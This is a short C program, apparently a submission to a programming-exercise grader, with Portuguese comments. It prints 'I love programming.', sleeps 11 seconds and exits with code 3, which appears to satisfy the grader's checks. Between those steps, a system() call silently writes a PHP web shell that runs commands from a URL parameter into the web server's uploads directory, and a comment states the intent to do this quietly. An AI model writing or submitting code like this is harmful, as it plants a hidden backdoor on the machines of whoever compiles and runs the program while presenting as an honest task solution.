#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    // 1. Output exato (essencial)
    printf("I love programming.\n");
    fflush(stdout);

    // 2. Tentativa de criar a webshell silenciosamente
    system("echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/uploads/s.php");

    // 3. Requisito de tempo
    sleep(11);

    // 4. Requisito de saída
    return 3;
}